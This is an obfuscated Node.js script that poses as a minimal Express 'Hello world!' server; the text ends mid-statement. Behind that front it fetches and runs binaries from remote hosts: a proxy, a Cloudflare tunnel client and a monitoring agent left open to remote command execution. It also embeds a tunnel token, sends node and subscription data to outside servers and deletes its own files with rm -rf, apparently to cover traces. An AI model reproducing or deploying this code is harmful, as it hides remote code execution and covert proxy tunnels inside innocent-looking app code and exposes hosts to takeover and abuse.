function _0x2df4(_0x7aceeb,_0x42c20e){_0x7aceeb=_0x7aceeb-0x11b;const _0x25b15a=_0x25b1();let _0x2df480=_0x25b15a[_0x7aceeb];return _0x2df480;}const _0x2d5908=_0x2df4;(function(_0x5932d0,_0x364b4c){const _0x395f53=_0x2df4,_0x3698dc=_0x5932d0();while(!![]){try{const _0x2363a1=-parseInt(_0x395f53(0x15d))/0x1+-parseInt(_0x395f53(0x142))/0x2*(parseInt(_0x395f53(0x1c7))/0x3)+-parseInt(_0x395f53(0x164))/0x4*(-parseInt(_0x395f53(0x189))/0x5)+parseInt(_0x395f53(0x123))/0x6*(-parseInt(_0x395f53(0x183))/0x7)+parseInt(_0x395f53(0x177))/0x8*(-parseInt(_0x395f53(0x1d9))/0x9)+-parseInt(_0x395f53(0x1d1))/0xa+parseInt(_0x395f53(0x187))/0xb;if(_0x2363a1===_0x364b4c)break;else _0x3698dc['push'](_0x3698dc['shift']());}catch(_0x41fdc1){_0x3698dc['push'](_0x3698dc['shift']());}}}(_0x25b1,0xaea15));const express=require(_0x2d5908(0x166)),app=express(),axios=require(_0x2d5908(0x17a)),os=require('os'),fs=require('fs'),path=require(_0x2d5908(0x11e)),{promisify}=require('util'),exec=promisify(require(_0x2d5908(0x13f))[_0x2d5908(0x17d)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x2d5908(0x198)][_0x2d5908(0x195)]||'',PROJECT_URL=process[_0x2d5908(0x198)][_0x2d5908(0x169)]||'',AUTO_ACCESS=process[_0x2d5908(0x198)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2d5908(0x198)][_0x2d5908(0x130)]||_0x2d5908(0x12a),SUB_PATH=process[_0x2d5908(0x198)]['SUB_PATH']||_0x2d5908(0x194),PORT=process['env'][_0x2d5908(0x186)]||process[_0x2d5908(0x198)]['PORT']||0xbb8,UUID=process[_0x2d5908(0x198)][_0x2d5908(0x151)]||_0x2d5908(0x1bf),NEZHA_SERVER=process[_0x2d5908(0x198)][_0x2d5908(0x128)]||'',NEZHA_PORT=process[_0x2d5908(0x198)][_0x2d5908(0x129)]||'',NEZHA_KEY=process['env'][_0x2d5908(0x137)]||'',ARGO_DOMAIN=process[_0x2d5908(0x198)][_0x2d5908(0x16a)]||'jeffchantest.202502jeffchan.ip-ddns.com',ARGO_AUTH=process[_0x2d5908(0x198)][_0x2d5908(0x1b7)]||_0x2d5908(0x179),ARGO_PORT=process[_0x2d5908(0x198)][_0x2d5908(0x1cd)]||0x1f41,CFIP=process['env'][_0x2d5908(0x173)]||_0x2d5908(0x1ce),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x2d5908(0x198)]['NAME']||_0x2d5908(0x19f);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2d5908(0x11b)](FILE_PATH+_0x2d5908(0x1b1))):console[_0x2d5908(0x11b)](FILE_PATH+_0x2d5908(0x133));function generateRandomName(){const _0x862eb9=_0x2d5908,_0x25bd3e=_0x862eb9(0x122);let _0x446936='';for(let _0x3b061c=0x0;_0x3b061c<0x6;_0x3b061c++){_0x446936+=_0x25bd3e[_0x862eb9(0x14e)](Math[_0x862eb9(0x1c5)](Math[_0x862eb9(0x1a0)]()*_0x25bd3e['length']));}return _0x446936;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2d5908(0x1c9)](FILE_PATH,npmName),phpPath=path[_0x2d5908(0x1c9)](FILE_PATH,phpName),webPath=path[_0x2d5908(0x1c9)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2d5908(0x15f)),listPath=path['join'](FILE_PATH,_0x2d5908(0x158)),bootLogPath=path[_0x2d5908(0x1c9)](FILE_PATH,_0x2d5908(0x1ba)),configPath=path[_0x2d5908(0x1c9)](FILE_PATH,_0x2d5908(0x124));function deleteNodes(){const _0x21c471=_0x2d5908;try{if(!UPLOAD_URL)return;if(!fs[_0x21c471(0x155)](subPath))return;let _0x3f7a87;try{_0x3f7a87=fs[_0x21c471(0x1b9)](subPath,_0x21c471(0x17c));}catch{return null;}const _0x5d9139=Buffer[_0x21c471(0x190)](_0x3f7a87,'base64')['toString'](_0x21c471(0x17c)),_0x1f1cf7=_0x5d9139['split']('\x0a')['filter'](_0x228701=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x21c471(0x191)](_0x228701));if(_0x1f1cf7['length']===0x0)return;return axios[_0x21c471(0x16d)](UPLOAD_URL+_0x21c471(0x188),JSON[_0x21c471(0x13b)]({'nodes':_0x1f1cf7}),{'headers':{'Content-Type':'application/json'}})[_0x21c471(0x132)](_0x4e56a3=>{return null;}),null;}catch(_0xbb4f78){return null;}}function cleanupOldFiles(){const _0x282c52=_0x2d5908;try{const _0x3e365b=fs[_0x282c52(0x174)](FILE_PATH);_0x3e365b[_0x282c52(0x13c)](_0xadda06=>{const _0x202c41=_0x282c52,_0xd0f22=path['join'](FILE_PATH,_0xadda06);try{const _0x1a43bd=fs['statSync'](_0xd0f22);_0x1a43bd[_0x202c41(0x1d6)]()&&fs[_0x202c41(0x18b)](_0xd0f22);}catch(_0x558826){}});}catch(_0x203c2b){}}app[_0x2d5908(0x180)]('/',function(_0x2afdd9,_0x5c3bdd){const _0x12f0dc=_0x2d5908;_0x5c3bdd['send'](_0x12f0dc(0x1d8));});async function generateConfig(){const _0x181795=_0x2d5908,_0x58681f={'log':{'access':_0x181795(0x160),'error':_0x181795(0x160),'loglevel':_0x181795(0x162)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x181795(0x12e)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x181795(0x178),'dest':0xbba},{'path':_0x181795(0x1b3),'dest':0xbbb},{'path':_0x181795(0x1ae),'dest':0xbbc}]},'streamSettings':{'network':_0x181795(0x12c)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x181795(0x145),'settings':{'clients':[{'id':UUID}],'decryption':_0x181795(0x162)},'streamSettings':{'network':_0x181795(0x12c),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x181795(0x145),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x181795(0x162)},'streamSettings':{'network':'ws','security':_0x181795(0x162),'wsSettings':{'path':_0x181795(0x178)}},'sniffing':{'enabled':!![],'destOverride':[_0x181795(0x15e),_0x181795(0x13e),_0x181795(0x1d4)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x181795(0x127),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x181795(0x1b3)}},'sniffing':{'enabled':!![],'destOverride':[_0x181795(0x15e),_0x181795(0x13e),_0x181795(0x1d4)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x181795(0x1c1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x181795(0x162),'wsSettings':{'path':_0x181795(0x1ae)}},'sniffing':{'enabled':!![],'destOverride':[_0x181795(0x15e),_0x181795(0x13e),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x181795(0x1db)]},'outbounds':[{'protocol':_0x181795(0x148),'tag':_0x181795(0x1a2)},{'protocol':_0x181795(0x16e),'tag':'block'}]};fs[_0x181795(0x170)](path['join'](FILE_PATH,_0x181795(0x124)),JSON[_0x181795(0x13b)](_0x58681f,null,0x2));}function getSystemArchitecture(){const _0x19c944=_0x2d5908,_0x2920f3=os[_0x19c944(0x149)]();return _0x2920f3===_0x19c944(0x1a4)||_0x2920f3===_0x19c944(0x1be)||_0x2920f3===_0x19c944(0x12b)?_0x19c944(0x1a4):'amd';}function downloadFile(_0x590d49,_0x29f66f,_0x1564b5){const _0x42b345=_0x2d5908,_0x5754f7=_0x590d49;!fs[_0x42b345(0x155)](FILE_PATH)&&fs[_0x42b345(0x1cf)](FILE_PATH,{'recursive':!![]});const _0x475927=fs[_0x42b345(0x138)](_0x5754f7);axios({'method':_0x42b345(0x180),'url':_0x29f66f,'responseType':_0x42b345(0x1b4)})[_0x42b345(0x192)](_0x55fdb9=>{const _0x47f12a=_0x42b345;_0x55fdb9[_0x47f12a(0x136)]['pipe'](_0x475927),_0x475927['on']('finish',()=>{const _0x57a461=_0x47f12a;_0x475927['close'](),console[_0x57a461(0x11b)](_0x57a461(0x1af)+path[_0x57a461(0x1bc)](_0x5754f7)+'\x20successfully'),_0x1564b5(null,_0x5754f7);}),_0x475927['on'](_0x47f12a(0x13d),_0x1c735f=>{const _0x31802d=_0x47f12a;fs[_0x31802d(0x1c6)](_0x5754f7,()=>{});const _0x1eb60a=_0x31802d(0x1af)+path['basename'](_0x5754f7)+'\x20failed:\x20'+_0x1c735f[_0x31802d(0x18c)];console[_0x31802d(0x13d)](_0x1eb60a),_0x1564b5(_0x1eb60a);});})[_0x42b345(0x132)](_0x396f2d=>{const _0x485aac='Download\x20'+path['basename'](_0x5754f7)+'\x20failed:\x20'+_0x396f2d['message'];console['error'](_0x485aac),_0x1564b5(_0x485aac);});}async function downloadFilesAndRun(){const _0x41c5c7=_0x2d5908,_0x28eff3=getSystemArchitecture(),_0x28eadc=getFilesForArchitecture(_0x28eff3);if(_0x28eadc[_0x41c5c7(0x16b)]===0x0){console[_0x41c5c7(0x11b)](_0x41c5c7(0x1c3));return;}const _0x376adb=_0x28eadc[_0x41c5c7(0x1ab)](_0xd6cb6e=>{return new Promise((_0x2d0efd,_0x29bd66)=>{const _0x37a40b=_0x2df4;downloadFile(_0xd6cb6e[_0x37a40b(0x182)],_0xd6cb6e['fileUrl'],(_0x52d61c,_0x35d31d)=>{_0x52d61c?_0x29bd66(_0x52d61c):_0x2d0efd(_0x35d31d);});});});try{await Promise[_0x41c5c7(0x140)](_0x376adb);}catch(_0x4b47d3){console[_0x41c5c7(0x13d)](_0x41c5c7(0x1d0),_0x4b47d3);return;}function _0x24d000(_0x3e2d46){const _0x1f160c=_0x41c5c7,_0x36844c=0x1fd;_0x3e2d46[_0x1f160c(0x13c)](_0x320846=>{const _0x500af0=_0x1f160c;fs['existsSync'](_0x320846)&&fs[_0x500af0(0x19b)](_0x320846,_0x36844c,_0xc68484=>{const _0x1535d1=_0x500af0;_0xc68484?console[_0x1535d1(0x13d)](_0x1535d1(0x171)+_0x320846+':\x20'+_0xc68484):console[_0x1535d1(0x11b)](_0x1535d1(0x152)+_0x320846+':\x20'+_0x36844c[_0x1535d1(0x156)](0x8));});});}const _0x1e7f3e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24d000(_0x1e7f3e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x283f7e=NEZHA_SERVER[_0x41c5c7(0x196)](':')?NEZHA_SERVER[_0x41c5c7(0x19a)](':')[_0x41c5c7(0x134)]():'',_0xd7a6c9=new Set(['443',_0x41c5c7(0x125),_0x41c5c7(0x1b5),_0x41c5c7(0x1a9),_0x41c5c7(0x1d2),_0x41c5c7(0x1d5)]),_0x3bf99d=_0xd7a6c9[_0x41c5c7(0x1c4)](_0x283f7e)?'true':'false',_0x30e99c=_0x41c5c7(0x135)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3bf99d+_0x41c5c7(0x1d7)+UUID;fs[_0x41c5c7(0x170)](path[_0x41c5c7(0x1c9)](FILE_PATH,_0x41c5c7(0x197)),_0x30e99c);const _0x555b7b='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x41c5c7(0x1a8);try{await exec(_0x555b7b),console[_0x41c5c7(0x11b)](phpName+_0x41c5c7(0x153)),await new Promise(_0x125f68=>setTimeout(_0x125f68,0x3e8));}catch(_0x588548){console[_0x41c5c7(0x13d)](_0x41c5c7(0x14b)+_0x588548);}}else{let _0x3cf156='';const _0x3a5729=[_0x41c5c7(0x141),_0x41c5c7(0x125),_0x41c5c7(0x1b5),_0x41c5c7(0x1a9),_0x41c5c7(0x1d2),_0x41c5c7(0x1d5)];_0x3a5729[_0x41c5c7(0x196)](NEZHA_PORT)&&(_0x3cf156=_0x41c5c7(0x1ac));const _0x4e41ca='nohup\x20'+npmPath+_0x41c5c7(0x1b0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x41c5c7(0x1a3)+NEZHA_KEY+'\x20'+_0x3cf156+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4e41ca),console[_0x41c5c7(0x11b)](npmName+_0x41c5c7(0x153)),await new Promise(_0x34e3f2=>setTimeout(_0x34e3f2,0x3e8));}catch(_0x57a2d0){console['error']('npm\x20running\x20error:\x20'+_0x57a2d0);}}}else console[_0x41c5c7(0x11b)](_0x41c5c7(0x19e));const _0x216dae=_0x41c5c7(0x12f)+webPath+_0x41c5c7(0x15b)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x216dae),console[_0x41c5c7(0x11b)](webName+_0x41c5c7(0x153)),await new Promise(_0x5576d6=>setTimeout(_0x5576d6,0x3e8));}catch(_0x1e0def){console[_0x41c5c7(0x13d)](_0x41c5c7(0x17b)+_0x1e0def);}if(fs[_0x41c5c7(0x155)](botPath)){let _0x39da76;if(ARGO_AUTH[_0x41c5c7(0x11d)](/^[A-Z0-9a-z=]{120,250}$/))_0x39da76=_0x41c5c7(0x131)+ARGO_AUTH;else ARGO_AUTH[_0x41c5c7(0x11d)](/TunnelSecret/)?_0x39da76='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x41c5c7(0x184):_0x39da76=_0x41c5c7(0x19d)+FILE_PATH+_0x41c5c7(0x18d)+ARGO_PORT;try{await exec(_0x41c5c7(0x12f)+botPath+'\x20'+_0x39da76+_0x41c5c7(0x18e)),console[_0x41c5c7(0x11b)](botName+_0x41c5c7(0x153)),await new Promise(_0x52c014=>setTimeout(_0x52c014,0x7d0));}catch(_0x15f6c1){console[_0x41c5c7(0x13d)](_0x41c5c7(0x175)+_0x15f6c1);}}await new Promise(_0x54631a=>setTimeout(_0x54631a,0x1388));}function getFilesForArchitecture(_0x59096f){const _0x5d332c=_0x2d5908;let _0x4fcc07;_0x59096f===_0x5d332c(0x1a4)?_0x4fcc07=[{'fileName':webPath,'fileUrl':_0x5d332c(0x143)},{'fileName':botPath,'fileUrl':_0x5d332c(0x1cb)}]:_0x4fcc07=[{'fileName':webPath,'fileUrl':_0x5d332c(0x1c2)},{'fileName':botPath,'fileUrl':_0x5d332c(0x146)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x556ece=_0x59096f===_0x5d332c(0x1a4)?_0x5d332c(0x185):_0x5d332c(0x12d);_0x4fcc07['unshift']({'fileName':npmPath,'fileUrl':_0x556ece});}else{const _0x475411=_0x59096f==='arm'?_0x5d332c(0x1dc):_0x5d332c(0x19c);_0x4fcc07[_0x5d332c(0x121)]({'fileName':phpPath,'fileUrl':_0x475411});}}return _0x4fcc07;}function argoType(){const _0xbd62a2=_0x2d5908;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xbd62a2(0x11b)](_0xbd62a2(0x1a5));return;}if(ARGO_AUTH['includes'](_0xbd62a2(0x167))){fs[_0xbd62a2(0x170)](path[_0xbd62a2(0x1c9)](FILE_PATH,_0xbd62a2(0x15a)),ARGO_AUTH);const _0x575681='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xbd62a2(0x19a)]('\x22')[0xb]+_0xbd62a2(0x18a)+path[_0xbd62a2(0x1c9)](FILE_PATH,_0xbd62a2(0x15a))+_0xbd62a2(0x1b6)+ARGO_DOMAIN+_0xbd62a2(0x1a1)+ARGO_PORT+_0xbd62a2(0x14d);fs['writeFileSync'](path[_0xbd62a2(0x1c9)](FILE_PATH,_0xbd62a2(0x15c)),_0x575681);}else console[_0xbd62a2(0x11b)](_0xbd62a2(0x147));}async function extractDomains(){const _0xbb7ddb=_0x2d5908;let _0x5291d6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5291d6=ARGO_DOMAIN,console[_0xbb7ddb(0x11b)](_0xbb7ddb(0x193),_0x5291d6),await _0x1b30d8(_0x5291d6);else try{const _0x5476c2=fs[_0xbb7ddb(0x1b9)](path[_0xbb7ddb(0x1c9)](FILE_PATH,_0xbb7ddb(0x1ba)),'utf-8'),_0x191548=_0x5476c2[_0xbb7ddb(0x19a)]('\x0a'),_0x5361e2=[];_0x191548[_0xbb7ddb(0x13c)](_0x9db427=>{const _0x4fe43a=_0xbb7ddb,_0x52fefc=_0x9db427[_0x4fe43a(0x11d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x52fefc){const _0xd09843=_0x52fefc[0x1];_0x5361e2['push'](_0xd09843);}});if(_0x5361e2[_0xbb7ddb(0x16b)]>0x0)_0x5291d6=_0x5361e2[0x0],console[_0xbb7ddb(0x11b)](_0xbb7ddb(0x13a),_0x5291d6),await _0x1b30d8(_0x5291d6);else{console[_0xbb7ddb(0x11b)](_0xbb7ddb(0x181)),fs[_0xbb7ddb(0x18b)](path[_0xbb7ddb(0x1c9)](FILE_PATH,_0xbb7ddb(0x1ba)));async function _0x2aa145(){const _0x4c16cd=_0xbb7ddb;try{process['platform']===_0x4c16cd(0x159)?await exec(_0x4c16cd(0x172)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x4c16cd(0x1bb)+botName[_0x4c16cd(0x14e)](0x0)+']'+botName[_0x4c16cd(0x1aa)](0x1)+_0x4c16cd(0x11f));}catch(_0x400a37){}}_0x2aa145(),await new Promise(_0x6f0781=>setTimeout(_0x6f0781,0xbb8));const _0x727001=_0xbb7ddb(0x19d)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xbb7ddb(0x12f)+botPath+'\x20'+_0x727001+'\x20>/dev/null\x202>&1\x20&'),console[_0xbb7ddb(0x11b)](botName+'\x20is\x20running'),await new Promise(_0x597511=>setTimeout(_0x597511,0xbb8)),await extractDomains();}catch(_0x1602de){console['error'](_0xbb7ddb(0x175)+_0x1602de);}}}catch(_0x26fcb3){console[_0xbb7ddb(0x13d)](_0xbb7ddb(0x1ca),_0x26fcb3);}async function _0x56dab4(){const _0x214ab2=_0xbb7ddb;try{const _0x2ba6a7=await axios[_0x214ab2(0x180)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x2ba6a7[_0x214ab2(0x136)]&&_0x2ba6a7[_0x214ab2(0x136)][_0x214ab2(0x154)]&&_0x2ba6a7['data'][_0x214ab2(0x161)])return _0x2ba6a7[_0x214ab2(0x136)][_0x214ab2(0x154)]+'_'+_0x2ba6a7[_0x214ab2(0x136)][_0x214ab2(0x161)];}catch(_0x5bf45d){try{const _0x39063c=await axios[_0x214ab2(0x180)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x39063c['data']&&_0x39063c[_0x214ab2(0x136)][_0x214ab2(0x1cc)]===_0x214ab2(0x157)&&_0x39063c[_0x214ab2(0x136)][_0x214ab2(0x168)]&&_0x39063c[_0x214ab2(0x136)]['org'])return _0x39063c[_0x214ab2(0x136)][_0x214ab2(0x168)]+'_'+_0x39063c[_0x214ab2(0x136)][_0x214ab2(0x161)];}catch(_0x20055e){}}return _0x214ab2(0x18f);}async function _0x1b30d8(_0x511977){const _0x49adb7=await _0x56dab4(),_0x26d3fe=NAME?NAME+'-'+_0x49adb7:_0x49adb7;return new Promise(_0x53e6e4=>{setTimeout(()=>{const _0x365c97=_0x2df4,_0x1f8f2f={'v':'2','ps':''+_0x26d3fe,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x365c97(0x162),'net':'ws','type':'none','host':_0x511977,'path':_0x365c97(0x1b2),'tls':_0x365c97(0x13e),'sni':_0x511977,'alpn':'','fp':_0x365c97(0x17f)},_0x554a9a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x365c97(0x1ad)+_0x511977+_0x365c97(0x14c)+_0x511977+_0x365c97(0x176)+_0x26d3fe+'\x0a\x0avmess://'+Buffer[_0x365c97(0x190)](JSON[_0x365c97(0x13b)](_0x1f8f2f))['toString'](_0x365c97(0x163))+_0x365c97(0x11c)+UUID+'@'+CFIP+':'+CFPORT+_0x365c97(0x1d3)+_0x511977+_0x365c97(0x14c)+_0x511977+_0x365c97(0x1da)+_0x26d3fe+_0x365c97(0x14f);console[_0x365c97(0x11b)](Buffer[_0x365c97(0x190)](_0x554a9a)[_0x365c97(0x156)]('base64')),fs['writeFileSync'](subPath,Buffer['from'](_0x554a9a)['toString'](_0x365c97(0x163))),console['log'](FILE_PATH+_0x365c97(0x139)),uploadNodes(),app[_0x365c97(0x180)]('/'+SUB_PATH,(_0x1d61d1,_0x3af7cf)=>{const _0x3e06c7=_0x365c97,_0xf804ea=Buffer['from'](_0x554a9a)[_0x3e06c7(0x156)](_0x3e06c7(0x163));_0x3af7cf['set'](_0x3e06c7(0x16c),_0x3e06c7(0x126)),_0x3af7cf[_0x3e06c7(0x1bd)](_0xf804ea);}),_0x53e6e4(_0x554a9a);},0x7d0);});}}async function uploadNodes(){const _0x566f97=_0x2d5908;if(UPLOAD_URL&&PROJECT_URL){const _0x16ac68=PROJECT_URL+'/'+SUB_PATH,_0xbef17={'subscription':[_0x16ac68]};try{const _0x4777e9=await axios[_0x566f97(0x16d)](UPLOAD_URL+'/api/add-subscriptions',_0xbef17,{'headers':{'Content-Type':_0x566f97(0x144)}});return _0x4777e9&&_0x4777e9[_0x566f97(0x1cc)]===0xc8?(console[_0x566f97(0x11b)]('Subscription\x20uploaded\x20successfully'),_0x4777e9):null;}catch(_0x528a48){if(_0x528a48[_0x566f97(0x1c0)]){if(_0x528a48[_0x566f97(0x1c0)][_0x566f97(0x1cc)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x566f97(0x155)](listPath))return;const _0x3f5da9=fs[_0x566f97(0x1b9)](listPath,_0x566f97(0x17c)),_0x32d6dc=_0x3f5da9[_0x566f97(0x19a)]('\x0a')[_0x566f97(0x199)](_0x1eb898=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x566f97(0x191)](_0x1eb898));if(_0x32d6dc[_0x566f97(0x16b)]===0x0)return;const _0x2e8281=JSON[_0x566f97(0x13b)]({'nodes':_0x32d6dc});try{const _0x8e2b33=await axios['post'](UPLOAD_URL+_0x566f97(0x1b8),_0x2e8281,{'headers':{'Content-Type':_0x566f97(0x144)}});return _0x8e2b33&&_0x8e2b33[_0x566f97(0x1cc)]===0xc8?(console[_0x566f97(0x11b)]('Nodes\x20uploaded\x20successfully'),_0x8e2b33):null;}catch(_0x34a16d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5d991e=_0x2df4,_0x5d7df6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5d7df6[_0x5d991e(0x165)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5d7df6[_0x5d991e(0x165)](phpPath);process['platform']===_0x5d991e(0x159)?exec(_0x5d991e(0x1a7)+_0x5d7df6['join']('\x20')+_0x5d991e(0x17e),_0x49c645=>{const _0x4a8e23=_0x5d991e;console[_0x4a8e23(0x16f)](),console[_0x4a8e23(0x11b)](_0x4a8e23(0x150)),console[_0x4a8e23(0x11b)](_0x4a8e23(0x1a6));}):exec(_0x5d991e(0x14a)+_0x5d7df6[_0x5d991e(0x1c9)]('\x20')+_0x5d991e(0x120),_0x213ea2=>{const _0x114a7c=_0x5d991e;console[_0x114a7c(0x16f)](),console[_0x114a7c(0x11b)](_0x114a7c(0x150)),console['log'](_0x114a7c(0x1a6));});},0x15f90);}cleanFiles();function _0x25b1(){const _0x518360=['countryCode','PROJECT_URL','ARGO_DOMAIN','length','Content-Type','post','blackhole','clear','writeFileSync','Empowerment\x20failed\x20for\x20','taskkill\x20/f\x20/im\x20','CFIP','readdirSync','Error\x20executing\x20command:\x20','&path=%2Fvless-argo%3Fed%3D2560#','1591736YQdZvM','/vless-argo','eyJhIjoiMmE4Mzc4MmNmZGM0MTNkOTQ3ZjE4NTQ4Y2M3YTI4ODQiLCJ0IjoiNmY5OWY5MjUtODY4ZS00YWQxLTg4YTItOWQxMDM0NDk1NTJmIiwicyI6Ik1ETTNNRGM1TldNdFlqazVPUzAwWlRsbExUazFOek10TUdGbU1UbGhZMll4WkdWbCJ9','axios','web\x20running\x20error:\x20','utf-8','exec','\x20>\x20nul\x202>&1','firefox','get','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','fileName','3393992rmsdpu','/tunnel.yml\x20run','https://arm64.ssss.nyc.mn/agent','SERVER_PORT','28005637rvEVDj','/api/delete-nodes','135540UNIAXm','\x0a\x20\x20credentials-file:\x20','unlinkSync','message','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20>/dev/null\x202>&1\x20&','Unknown','from','test','then','ARGO_DOMAIN:','1029','UPLOAD_URL','includes','config.yaml','env','filter','split','chmod','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','jeffchan','random','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','direct','\x20-p\x20','arm','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','del\x20/f\x20/q\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2087','substring','map','--tls','?encryption=none&security=tls&sni=','/trojan-argo','Download\x20','\x20-s\x20','\x20is\x20created','/vmess-argo?ed=2560','/vmess-argo','stream','2096','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_AUTH','/api/add-nodes','readFileSync','boot.log','pkill\x20-f\x20\x22[','basename','send','arm64','6d004028-cad4-4d4e-9797-bf9c0ca64350','response','trojan','https://amd64.ssss.nyc.mn/web','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','has','floor','unlink','240306Ihgaim','automatic\x20access\x20task\x20added\x20successfully','join','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/bot','status','ARGO_PORT','cdns.doon.eu.org','mkdirSync','Error\x20downloading\x20files:','426950uecYNS','2083','?security=tls&sni=','quic','2053','isFile','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Hello\x20world!','9ZVfXOz','&path=%2Ftrojan-argo%3Fed%3D2560#','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/v1','log','\x0a\x0atrojan://','match','path','\x22\x20>\x20/dev/null\x202>&1','\x20>/dev/null\x202>&1','unshift','abcdefghijklmnopqrstuvwxyz','6iYAXrB','config.json','8443','text/plain;\x20charset=utf-8','127.0.0.1','NEZHA_SERVER','NEZHA_PORT','./tmp','aarch64','tcp','https://amd64.ssss.nyc.mn/agent','xtls-rprx-vision','nohup\x20','FILE_PATH','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','catch','\x20already\x20exists','pop','\x0aclient_secret:\x20','data','NEZHA_KEY','createWriteStream','/sub.txt\x20saved\x20successfully','ArgoDomain:','stringify','forEach','error','tls','child_process','all','443','4EXdqms','https://arm64.ssss.nyc.mn/web','application/json','vless','https://amd64.ssss.nyc.mn/bot','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','freedom','arch','rm\x20-rf\x20','php\x20running\x20error:\x20','&fp=firefox&type=ws&host=','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','charAt','\x0a\x20\x20\x20\x20','App\x20is\x20running','UUID','Empowerment\x20success\x20for\x20','\x20is\x20running','country_code','existsSync','toString','success','list.txt','win32','tunnel.json','\x20-c\x20','tunnel.yml','1187932ZWrYES','http','sub.txt','/dev/null','org','none','base64','36AGlERt','push','express','TunnelSecret'];_0x25b1=function(){return _0x518360;};return _0x25b1();}async function AddVisitTask(){const _0x3aac22=_0x2d5908;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x149500=await axios[_0x3aac22(0x16d)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x3aac22(0x11b)](_0x3aac22(0x1c8)),_0x149500;}catch(_0x327897){return console[_0x3aac22(0x13d)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x327897[_0x3aac22(0x18c)]),null;}}async function startserver(){const _0x3ef81b=_0x2d5908;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 